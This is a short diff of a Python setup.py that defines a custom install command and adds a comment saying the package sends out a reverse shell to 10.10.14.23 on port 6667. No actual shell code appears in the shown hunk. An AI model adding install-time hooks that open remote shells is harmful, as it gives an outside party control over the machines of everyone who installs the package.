@@ -2,6 +2,8 @@ from setuptools import setup
 from setuptools.command.install import install
 import os
 
+# Sends out a reverse shell to 10.10.14.23 6667
+
 class CustomInstall(install):
     def run(self):
         install.run(self)
